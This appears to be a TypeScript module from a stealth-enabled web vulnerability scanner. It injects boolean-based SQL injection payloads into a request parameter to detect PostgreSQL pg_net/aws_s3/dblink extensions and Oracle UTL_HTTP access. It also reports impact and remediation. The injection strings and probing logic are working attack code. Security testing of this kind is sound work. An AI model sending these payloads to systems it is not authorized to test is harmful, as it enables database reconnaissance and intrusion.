/**
 * SOHE God Rail v3 — Cloud DBaaS & Outbound Extension Audit Module
 *
 * Audits whether database-level network extensions or cloud integrations are enabled,
 * which could expose database servers to Out-of-Band SSRF or Cloud Metadata pivoting:
 * - PostgreSQL: `pg_net` (`net.http_get`), `aws_s3` (`table_import_from_s3`), `dblink`
 * - Oracle: `UTL_HTTP.request`, `UTL_INADDR`, `UTL_TCP`
 * - MSSQL: `sp_OACreate` / `MSXML2.ServerXMLHTTP`, `xp_dirtree`
 * - MySQL / Aurora: `LOAD DATA FROM S3`
 *
 * Uses non-destructive extension queries and safe canary lookups.
 */

import { IAttackModule, ModuleExecutionResult } from './IAttackModule';
import { StrategyContext } from '../engine/StrategyPlanner';
import { GhostNetwork, GhostHttpRequest } from '../stealth/GhostNetwork';
import { AdaptiveResponseOracle } from '../engine/AdaptiveResponseOracle';
import { DataStoreIdentity } from '../DataStoreFingerprinter';
import { ConfirmedFinding } from '../ProofCollector';

export class CloudSsrfModule implements IAttackModule {
  readonly name = 'CloudSsrfModule';
  readonly description = 'Audits database engine outbound network extensions and cloud integrations (pg_net, aws_s3, UTL_HTTP).';

  shouldExecute(_ctx: StrategyContext, identity: DataStoreIdentity): boolean {
    return identity.type === 'PostgreSQL' || identity.type === 'Oracle' || identity.type === 'Microsoft SQL Server' || identity.type === 'Unknown';
  }

  async execute(
    ctx: StrategyContext,
    network: GhostNetwork,
    oracle: AdaptiveResponseOracle
  ): Promise<ModuleExecutionResult> {
    const findings: ConfirmedFinding[] = [];
    const evidenceLogged: string[] = [];

    // Test 1: PostgreSQL Extension Audit (pg_net / aws_s3)
    const pgExtensionTest = await this.auditPgExtensions(ctx, network, oracle);
    if (pgExtensionTest) {
      findings.push(pgExtensionTest);
      return { findings, evidenceLogged };
    }

    // Test 2: Oracle UTL_HTTP / Network Package Existence
    const oracleUtlTest = await this.auditOracleUtlPackages(ctx, network, oracle);
    if (oracleUtlTest) {
      findings.push(oracleUtlTest);
      return { findings, evidenceLogged };
    }

    evidenceLogged.push('Cloud DBaaS outbound network integration check: No dangerous outbound extensions active.');
    return { findings, evidenceLogged };
  }

  private async auditPgExtensions(
    ctx: StrategyContext,
    network: GhostNetwork,
    oracle: AdaptiveResponseOracle
  ): Promise<ConfirmedFinding | null> {
    // Non-destructive probe: Check if pg_net or aws_s3 is installed in pg_extension
    const payload = `' AND (SELECT count(*) FROM pg_extension WHERE extname IN ('pg_net','aws_s3','dblink')) > 0 AND '1'='1`;
    const res = await this.sendProbe(ctx, payload, network);

    if (oracle.isTrue(res).isTrue) {
      return {
        id: `cloud-ssrf-pg-${Date.now()}`,
        vulnerabilityType: 'Database Outbound Extension Enabled (PostgreSQL pg_net / aws_s3 / dblink)',
        severity: 'Critical',
        confidence: 'Confirmed',
        targetUrl: ctx.baseRequest.url,
        parameter: ctx.parameterName,
        payload,
        description: `The database instance has outbound network extensions (pg_net, aws_s3, or dblink) installed and accessible from the web application user context.`,
        impact: 'Database-level SSRF, potential AWS IMDS metadata token access, and arbitrary outbound HTTP webhook abuse.',
        remediation: 'Drop unused dangerous extensions (DROP EXTENSION IF EXISTS pg_net) and revoke EXECUTE privileges from the web user role.',
        evidence: [
          {
            requestUrl: ctx.baseRequest.url,
            requestMethod: ctx.baseRequest.method,
            requestHeaders: ctx.baseRequest.headers,
            requestBody: ctx.baseRequest.body,
            responseStatus: res.status,
            responseHeaders: res.headers,
            responseBodySnippet: res.body.substring(0, 1000),
            highlightRegions: ['pg_extension match for pg_net / aws_s3 / dblink evaluated true'],
          },
        ],
      };
    }

    return null;
  }

  private async auditOracleUtlPackages(
    ctx: StrategyContext,
    network: GhostNetwork,
    oracle: AdaptiveResponseOracle
  ): Promise<ConfirmedFinding | null> {
    // Non-destructive probe: Check if UTL_HTTP is accessible in Oracle ALL_OBJECTS
    const payload = `' AND (SELECT count(*) FROM all_objects WHERE object_name = 'UTL_HTTP' AND status = 'VALID') > 0 AND '1'='1`;
    const res = await this.sendProbe(ctx, payload, network);

    if (oracle.isTrue(res).isTrue) {
      return {
        id: `cloud-ssrf-oracle-${Date.now()}`,
        vulnerabilityType: 'Dangerous Outbound Package Accessible (Oracle UTL_HTTP)',
        severity: 'High',
        confidence: 'Confirmed',
        targetUrl: ctx.baseRequest.url,
        parameter: ctx.parameterName,
        payload,
        description: `The Oracle database user context has access to the UTL_HTTP package, allowing outbound network connections.`,
        impact: 'Outbound network pivoting and data exfiltration from database tier.',
        remediation: 'Revoke EXECUTE on UTL_HTTP and configure strict Oracle Network Access Control Lists (ACLs).',
        evidence: [
          {
            requestUrl: ctx.baseRequest.url,
            requestMethod: ctx.baseRequest.method,
            requestHeaders: ctx.baseRequest.headers,
            requestBody: ctx.baseRequest.body,
            responseStatus: res.status,
            responseHeaders: res.headers,
            responseBodySnippet: res.body.substring(0, 1000),
            highlightRegions: ['UTL_HTTP package accessibility verified'],
          },
        ],
      };
    }

    return null;
  }

  private async sendProbe(ctx: StrategyContext, payload: string, network: GhostNetwork) {
    const req: GhostHttpRequest = JSON.parse(JSON.stringify(ctx.baseRequest));
    const url = new URL(req.url);
    url.searchParams.set(ctx.parameterName, payload);
    req.url = url.toString();
    return await network.executeRequest(req);
  }
}
